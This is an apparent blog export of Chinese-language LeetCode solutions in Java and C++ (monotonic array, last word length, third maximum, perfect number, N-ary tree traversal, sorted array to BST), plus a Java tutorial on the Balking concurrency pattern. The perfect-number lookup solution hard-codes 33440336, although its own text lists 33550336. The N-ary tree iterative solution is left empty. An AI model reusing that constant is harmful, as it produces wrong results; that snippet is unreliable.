<h3 id="示例5："><a href="#示例5：" class="headerlink" title="示例5："></a>示例5：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[1,1,1]</span><br><span class="line">输出：true</span><br></pre></td></tr></table></figure>
<h3 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h3><ol>
<li>1 &lt;= A.length &lt;= 50000</li>
<li>-100000 &lt;= A[i] &lt;= 100000<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3>遍历两次数组，分别判断是否递增或者递减。时间复杂度O(2 * n)</li>
</ol>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isMonotonic</span><span class="params">(<span class="keyword">int</span>[] A)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">boolean</span> isAsc = isAsc(A);</span><br><span class="line">	<span class="keyword">boolean</span> isDesc = isDesc(A);</span><br><span class="line">	<span class="keyword">return</span> isAsc || isDesc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">isAsc</span><span class="params">(<span class="keyword">int</span>[] A)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; A.length - <span class="number">1</span>;i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (A[i + <span class="number">1</span>] &lt; A[i]) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">isDesc</span><span class="params">(<span class="keyword">int</span>[] A)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; A.length - <span class="number">1</span>;i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (A[i + <span class="number">1</span>] &gt; A[i]) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="CPP"><a href="#CPP" class="headerlink" title="CPP"></a>CPP</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isAsc</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp;A)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; A.<span class="built_in">size</span>() - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (A[i + <span class="number">1</span>] &lt; A[i]) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isDesc</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp;A)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; A.<span class="built_in">size</span>() - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (A[i + <span class="number">1</span>] &gt; A[i]) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isMonotonic</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp;A)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> isAsc(A) || isDesc(A);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p>遍历两次感觉有点多余了，那么是不是可以把遍历次数限制在一次呢。其实是可以的。我们可以在一次循环中判断数列是否是一个单调数列。</p>
<p>定义两个变量isAcs，isDesc，初始化为true。然后遍历数列，只要在遍历的过程中，发现A[i] &lt; A[i + 1]， 那么数列就不是递减的，isDesc就是false，反之，如果A[i] &gt; A[i + 1]，数列就不是递增的，isAsc就是false。最后的结果，取isAsc || isDesc即可，两者只要一个为true，就是单调序列。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isMonotonic</span><span class="params">(<span class="keyword">int</span>[] A)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">boolean</span> isAsc = <span class="keyword">true</span>;</span><br><span class="line">		<span class="keyword">boolean</span> isDesc = <span class="keyword">true</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; A.length - <span class="number">1</span>;i++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (A[i] &lt; A[i + <span class="number">1</span>]) &#123;</span><br><span class="line">				isDesc = <span class="keyword">false</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			<span class="keyword">if</span> (A[i] &gt; A[i + <span class="number">1</span>]) &#123;</span><br><span class="line">				isAsc = <span class="keyword">false</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">return</span> isAsc || isDesc;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h4 id="CPP-1"><a href="#CPP-1" class="headerlink" title="CPP"></a>CPP</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isMonotonic</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp;A)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">bool</span> isAsc = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">bool</span> isDesc = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; A.<span class="built_in">size</span>() - <span class="number">1</span>;i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (A[i] &lt; A[i + <span class="number">1</span>]) &#123;</span><br><span class="line">                isDesc = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (A[i] &gt; A[i + <span class="number">1</span>]) &#123;</span><br><span class="line">                isAsc = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> isAsc || isDesc;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>数组</tag>
      </tags>
  </entry>
  <entry>
    <title>Balking 模式</title>
    <url>/2018/09/05/Java/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/4.Balking%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="Balking-模式"><a href="#Balking-模式" class="headerlink" title="Balking 模式"></a>Balking 模式</h1><p>所谓Balk，就是“停止并返回”的意思，如果现在不适合执行这个操作，或者没有必要执行这个操作，就停止处理，直接返回。</p>
<h2 id="示例程序"><a href="#示例程序" class="headerlink" title="示例程序"></a>示例程序</h2><p>我们来看一个使用了Balking模式的简单示例程序。这个程序会定期将当前数据内容写入文件中。<br>当数据内容被写入时，会完全覆盖上次写入的内容，只有最新的内容才会被保存。<br>另外，当写入的内容与上次写入的内容完全相同时，再向文件写入就显得多余了，所以就不再执行写入操作。也就是说，该程序以“数据内容存在不同”作为守护条件，如果数据内容相同，则不再执行写入操作，直接返回。</p>
<h3 id="类的一览表"><a href="#类的一览表" class="headerlink" title="类的一览表"></a>类的一览表</h3><table>
<thead>
<tr>
<th>名字</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Data</td>
<td>表示可以修改并保存的数据的类</td>
</tr>
<tr>
<td>SaveThread</td>
<td>定期保存数据内容的类</td>
</tr>
<tr>
<td>ChangeThread</td>
<td>修改并保存数据内容的类</td>
</tr>
<tr>
<td>Main</td>
<td>测试程序行为的类</td>
</tr>
</tbody></table>
<h3 id="data类"><a href="#data类" class="headerlink" title="data类"></a>data类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Data</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> String fileName;    <span class="comment">// 执行保存的文件名称</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> String content;    <span class="comment">// 表示数据内容的字符串</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">boolean</span> changed;    <span class="comment">// 数据内容是否被修改过</span></span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Data</span><span class="params">(String fileName, String content)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.fileName = fileName;</span><br><span class="line">		<span class="keyword">this</span>.content = content;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">change</span><span class="params">(String newContent)</span> </span>&#123;</span><br><span class="line">		content = newContent;</span><br><span class="line">		changed = <span class="keyword">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">save</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (!changed) &#123;</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		doSave();</span><br><span class="line">		changed = <span class="keyword">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">doSave</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">		System.out.println(Thread.currentThread().getName() + <span class="string">" calls doSave. content = "</span> + content);</span><br><span class="line">		Writer writer = <span class="keyword">new</span> FileWriter(fileName);</span><br><span class="line">		writer.write(content);</span><br><span class="line">		writer.close();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="SaveThread类"><a href="#SaveThread类" class="headerlink" title="SaveThread类"></a>SaveThread类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SaveThread</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> Data data;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">SaveThread</span><span class="params">(String name, Data data)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>(name);</span><br><span class="line">		<span class="keyword">this</span>.data = data;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			<span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">				data.save();</span><br><span class="line">				Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ChangeThread类"><a href="#ChangeThread类" class="headerlink" title="ChangeThread类"></a>ChangeThread类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ChangeThread</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> Data data;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> Random random = <span class="keyword">new</span> Random();</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">ChangeThread</span><span class="params">(String name, Data data)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>(name);</span><br><span class="line">		<span class="keyword">this</span>.data = data;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;<span class="keyword">true</span>;i++) &#123;</span><br><span class="line">				data.change(<span class="string">"No."</span> + i);</span><br><span class="line">				Thread.sleep(random.nextInt(<span class="number">1000</span>));</span><br><span class="line">				data.save();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Main类"><a href="#Main类" class="headerlink" title="Main类"></a>Main类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		Data data = <span class="keyword">new</span> Data(<span class="string">"data.txt"</span>, <span class="string">"(empty)"</span>);</span><br><span class="line">		<span class="keyword">new</span> ChangeThread(<span class="string">"ChangeThread"</span>, data).start();</span><br><span class="line">		<span class="keyword">new</span> SaveThread(<span class="string">"SaveThread"</span>, data).start();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>java多线程设计模式</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>多线程</tag>
        <tag>设计模式</tag>
        <tag>Balking 模式</tag>
      </tags>
  </entry>
  <entry>
    <title>58. 最后一个单词的长度</title>
    <url>/2018/09/04/LeetCode/leetcode-000058.%20%E6%9C%80%E5%90%8E%E4%B8%80%E4%B8%AA%E5%8D%95%E8%AF%8D%E7%9A%84%E9%95%BF%E5%BA%A6/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个仅包含大小写字母和空格 <code>&#39; &#39;</code> 的字符串，返回其最后一个单词的长度。</p>
<p>如果不存在最后一个单词，请返回 0 。</p>
<p><strong>说明：</strong>一个单词是指由字母组成，但不包含任何空格的字符串。<br><strong>示例：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: <span class="string">"Hello World"</span></span><br><span class="line">输出: <span class="number">5</span></span><br></pre></td></tr></table></figure>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>题目的意思就是找到最后一个非空格序列的长度，那么首先去掉首尾的空格，然后找到最后一个空格出现的索引。如果索引为-1，说明剩下的序列中没有空格，直接返回该序列的长度即可，否则，返回序列长度减去1减去索引的值就行。</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">lengthOfLastWord</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">null</span> == s || <span class="number">0</span> == s.trim().length()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    s = s.trim();</span><br><span class="line">    <span class="keyword">int</span> index = s.lastIndexOf(<span class="string">' '</span>);</span><br><span class="line">    <span class="keyword">if</span> (-<span class="number">1</span> == index) &#123;</span><br><span class="line">        <span class="keyword">return</span> s.length();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s.length() - <span class="number">1</span> - index;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>414. 第三大的数</title>
    <url>/2018/09/04/LeetCode/leetcode-000414.%20%E7%AC%AC%E4%B8%89%E5%A4%A7%E7%9A%84%E6%95%B0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个非空数组，返回此数组中第三大的数。如果不存在，则返回数组中最大的数。要求算法时间复杂度必须是O(n)。<br><strong>示例1：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: [<span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">输出: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">解释: 第三大的数是 <span class="number">1</span>.</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: [<span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">输出: <span class="number">2</span></span><br><span class="line"></span><br><span class="line">解释: 第三大的数不存在, 所以返回最大的数 <span class="number">2</span> .</span><br></pre></td></tr></table></figure>

<p><strong>示例3：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: [<span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">输出: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">解释: 注意，要求返回第三大的数，是指第三大且唯一出现的数。</span><br><span class="line">存在两个值为<span class="number">2</span>的数，它们都排第二。</span><br></pre></td></tr></table></figure>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>用三个变量first, second, third来分别保存第一大，第二大，和第三大的数，然后我们遍历数组，如果遍历到的数字大于当前第一大的数first，那么三个变量各自错位赋值，如果当前数字大于second，小于first，那么就更新second和third，如果当前数字大于third，小于second，那就只更新third，注意这里有个坑，就是初始化要用长整型long的最小值，否则当数组中有Integer.MIN_VALUE存在时，程序就不知道该返回Integer.MIN_VALUE还是最大值first了</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">thirdMax</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">long</span> first = Long.MIN_VALUE;</span><br><span class="line">    <span class="keyword">long</span> second = Long.MIN_VALUE;</span><br><span class="line">    <span class="keyword">long</span> third = Long.MIN_VALUE;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> num : nums) &#123;</span><br><span class="line">        <span class="keyword">if</span> (num &gt; first) &#123;</span><br><span class="line">            third = second;</span><br><span class="line">            second = first;</span><br><span class="line">            first = num;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (num &gt; second &amp;&amp; num &lt; first) &#123;</span><br><span class="line">            third = second;</span><br><span class="line">            second = num;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (num &gt; third &amp;&amp; num &lt; second) &#123;</span><br><span class="line">            third = num;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">int</span>) ((Long.MIN_VALUE == third || second == third) ? first : third);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>507. 完美数</title>
    <url>/2018/09/04/LeetCode/leetcode-000507.%20%E5%AE%8C%E7%BE%8E%E6%95%B0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>对于一个 正整数，如果它和除了它自身以外的所有正因子之和相等，我们称它为“完美数”。</p>
<p>给定一个 正整数 n， 如果他是完美数，返回 True，否则返回 False<br><strong>示例：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: <span class="number">28</span></span><br><span class="line">输出: True</span><br><span class="line">解释: <span class="number">28</span> = <span class="number">1</span> + <span class="number">2</span> + <span class="number">4</span> + <span class="number">7</span> + <span class="number">14</span></span><br></pre></td></tr></table></figure>
<p><strong>注意：</strong>输入的数字 n 不会超过 100,000,000. (1e8)</p>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><h4 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h4><p>因为题目将范围限制在了1亿以内，那么已知一亿以内的完美数有5个：6，28，496，8128，33550336。</p>
<h4 id="解法2"><a href="#解法2" class="headerlink" title="解法2"></a>解法2</h4><p>暴力</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><h4 id="解法1-1"><a href="#解法1-1" class="headerlink" title="解法1"></a>解法1</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">checkPerfectNumber</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">6</span> == num || <span class="number">28</span> == num || <span class="number">496</span> == num || <span class="number">8128</span> == num || <span class="number">33440336</span> == num) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="解法2-1"><a href="#解法2-1" class="headerlink" title="解法2"></a>解法2</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">checkPerfectNumber</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">1</span> == num) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt; (<span class="keyword">int</span>)Math.sqrt(num) + <span class="number">1</span>;i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (num % i == <span class="number">0</span>) &#123;</span><br><span class="line">            sum += i + num / i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum == num;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>589. N叉树的前序遍历</title>
    <url>/2018/09/04/LeetCode/leetcode-000589.%20N%E5%8F%89%E6%A0%91%E7%9A%84%E5%89%8D%E5%BA%8F%E9%81%8D%E5%8E%86/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个N叉树，返回其节点值的前序遍历。<br>例如，给定一个 3叉树 :<br><img src="https://huhansi.github.io/images/2020-03-02-000559-NaryTreeExample.png" alt="3叉树"><br>返回其前序遍历: [1,3,5,6,2,4]。<br>说明: 递归法很简单，你可以使用迭代法完成此题吗?</p>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><h4 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h4><p>递归</p>
<h4 id="解法2"><a href="#解法2" class="headerlink" title="解法2"></a>解法2</h4><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><h4 id="代码1"><a href="#代码1" class="headerlink" title="代码1"></a>代码1</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;Integer&gt; result = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">preorder</span><span class="params">(Node root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">null</span> == root) &#123;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    result.add(root.val);</span><br><span class="line">    <span class="keyword">for</span> (Node node : root.children) &#123;</span><br><span class="line">        preorder(node);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="代码2"><a href="#代码2" class="headerlink" title="代码2"></a>代码2</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>108. 将有序数组转换为二叉搜索树</title>
    <url>/2018/09/03/LeetCode/leetcode-000108.%20%E5%B0%86%E6%9C%89%E5%BA%8F%E6%95%B0%E7%BB%84%E8%BD%AC%E6%8D%A2%E4%B8%BA%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>将一个按照升序排列的有序数组，转换为一棵高度平衡二叉搜索树。</p>
<p>本题中，一个高度平衡二叉树是指一个二叉树每个节点 的左右两个子树的高度差的绝对值不超过 1。<br><strong>示例：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">给定有序数组: [-10,-3,0,5,9],</span><br><span class="line"></span><br><span class="line">一个可能的答案是：[0,-3,9,-10,null,5]，它可以表示下面这个高度平衡二叉搜索树：</span><br><span class="line"></span><br><span class="line">      0</span><br><span class="line">     &#x2F; \</span><br><span class="line">   -3   9</span><br><span class="line">   &#x2F;   &#x2F;</span><br><span class="line"> -10  5</span><br></pre></td></tr></table></figure>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>每次建左右子树的时候都用数组的中间元素作为根结点。</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> TreeNode <span class="title">sortedArrayToBST</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> binaryBuildBST(nums, <span class="number">0</span>, nums.length - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> TreeNode <span class="title">binaryBuildBST</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> begin, <span class="keyword">int</span> end)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (begin &gt; end) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">		</span><br><span class="line">    <span class="keyword">int</span> mid = (begin + end) / <span class="number">2</span>;</span><br><span class="line">    TreeNode root = <span class="keyword">new</span> TreeNode(nums[mid]);</span><br><span class="line">    root.left = binaryBuildBST(nums, begin, mid - <span class="number">1</span>);</span><br><span class="line">    root.right = binaryBuildBST(nums, mid + <span class="number">1</span>, end);</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
